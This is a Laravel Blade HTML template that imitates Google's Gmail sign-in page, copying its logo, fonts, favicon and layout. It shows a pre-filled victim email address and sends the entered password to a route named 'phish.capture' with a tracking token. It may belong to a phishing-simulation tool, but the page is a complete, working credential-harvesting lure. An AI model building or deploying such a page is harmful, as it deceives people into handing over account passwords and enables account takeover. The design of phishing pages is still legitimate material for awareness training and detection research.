<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex">
    <title>Gmail</title>
    <link rel="icon" href="https://accounts.google.com/favicon.ico" type="image/x-icon">
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:"Google Sans",roboto,"Noto Sans Myanmar UI","Noto Sans Khmer",arial,sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column}
        .main{flex:1;display:flex;align-items:center;justify-content:center;padding:20px}
        .card{width:100%;max-width:450px}
        .logo-wrap{display:flex;justify-content:center;margin-bottom:8px}
        .logo-wrap svg{height:48px;width:48px}
        h1{font-family:"Google Sans",roboto,sans-serif;font-size:36px;font-weight:400;color:rgb(31,31,31);text-align:center;line-height:44px;margin:24px 0 0}
        .subtitle{font-size:16px;color:rgb(95,99,104);text-align:center;line-height:24px;margin-top:4px}
        .email-pill{display:flex;align-items:center;padding:6px 6px 6px 16px;border:1px solid #dadce0;border-radius:100px;margin:32px 0 0;cursor:pointer;transition:background .15s}
        .email-pill:hover{background:#f7f8f8}
        .avatar{width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,#1a73e8,#4285f4);display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px;font-weight:500;margin-right:12px;flex-shrink:0}
        .email-text{font-size:14px;color:rgb(31,31,31);flex:1}
        .chevron{width:24px;height:24px;color:rgb(95,99,104);flex-shrink:0}
        .form{margin-top:24px}
        .input-wrap{position:relative;margin-bottom:16px}
        .input-wrap input{width:100%;padding:13px 15px;font-size:16px;font-family:"Google Sans",roboto,sans-serif;border:1px solid #dadce0;border-radius:4px;outline:none;background:rgba(0,0,0,0);color:rgb(31,31,31);transition:border-color .2s}
        .input-wrap input:focus{border-color:#0B57D0}
        .input-wrap label{position:absolute;top:-8px;left:10px;background:#fff;padding:0 4px;font-size:12px;color:#0B57D0;font-weight:500}
        .forgot{font-size:14px;color:#0B57D0;font-weight:500;background:none;border:none;cursor:pointer;padding:0;border-radius:4px;font-family:"Google Sans",roboto,sans-serif}
        .forgot:hover{background:rgba(11,87,208,.04)}
        .guest{font-size:14px;color:rgb(31,31,31);margin-top:16px;line-height:20px}
        .guest a{color:#0B57D0;text-decoration:none;font-weight:500}
        .btn-row{display:flex;justify-content:space-between;align-items:center;margin-top:24px;padding:6px 0}
        .btn-create{font-size:14px;color:#0B57D0;font-weight:500;background:none;border:none;cursor:pointer;padding:0 16px;height:40px;border-radius:20px;font-family:"Google Sans",roboto,sans-serif;transition:background .15s}
        .btn-create:hover{background:rgba(11,87,208,.04)}
        .btn-next{font-size:14px;color:#fff;background:rgb(11,87,208);border:none;cursor:pointer;padding:0 24px;height:40px;border-radius:20px;font-weight:500;font-family:"Google Sans",roboto,sans-serif;transition:background .15s}
        .btn-next:hover{background:#0B57D0;box-shadow:0 1px 3px rgba(0,0,0,.24)}
        .footer{display:flex;justify-content:flex-end;gap:8px;padding:16px 24px}
        .footer a{font-size:12px;color:rgb(31,31,31);text-decoration:none;padding:8px 12px;border-radius:8px}
        .footer a:hover{background:rgba(0,0,0,.04)}
        @media(max-width:480px){h1{font-size:28px;line-height:36px}.btn-row{flex-direction:column;gap:12px}}
    </style>
</head>
<body>
    <div class="main">
        <div class="card">
            <div class="logo-wrap">
                <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
                    <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"/>
                    <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"/>
                    <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"/>
                    <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"/>
                </svg>
            </div>
            <h1>Sign in</h1>
            <p class="subtitle">to continue to Gmail</p>

            <div class="email-pill">
                <div class="avatar">{{ strtoupper(substr($email, 0, 1)) }}</div>
                <span class="email-text">{{ $email }}</span>
                <svg class="chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
            </div>

            <div class="form">
                <form action="{{ route('phish.capture', ['provider' => 'google', 'token' => $token]) }}" method="POST">
                    @csrf
                    <div class="input-wrap">
                        <label for="password">Enter your password</label>
                        <input type="password" id="password" name="password" autocomplete="current-password" required autofocus>
                    </div>
                    <button type="button" class="forgot">Forgot email?</button>
                    <div class="guest">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more about using Guest mode</a></div>
                    <div class="btn-row">
                        <button type="button" class="btn-create">Create account</button>
                        <button type="submit" class="btn-next">Next</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <div class="footer">
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
    </div>
</body>
</html>
